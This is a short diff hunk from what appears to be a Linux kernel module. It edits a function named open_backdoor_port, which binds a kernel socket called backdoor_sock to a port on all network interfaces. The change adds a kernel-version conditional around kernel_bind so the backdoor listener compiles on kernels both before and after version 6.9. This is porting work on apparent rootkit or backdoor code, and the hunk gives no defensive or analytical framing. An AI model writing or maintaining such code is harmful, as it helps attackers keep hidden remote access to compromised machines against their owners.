@@ -1430,7 +1430,11 @@ static int open_backdoor_port(int port)
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = htonl(INADDR_ANY);
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0)
     ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
+#else
+    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
+#endif
     if (ret < 0)
         goto out;
 
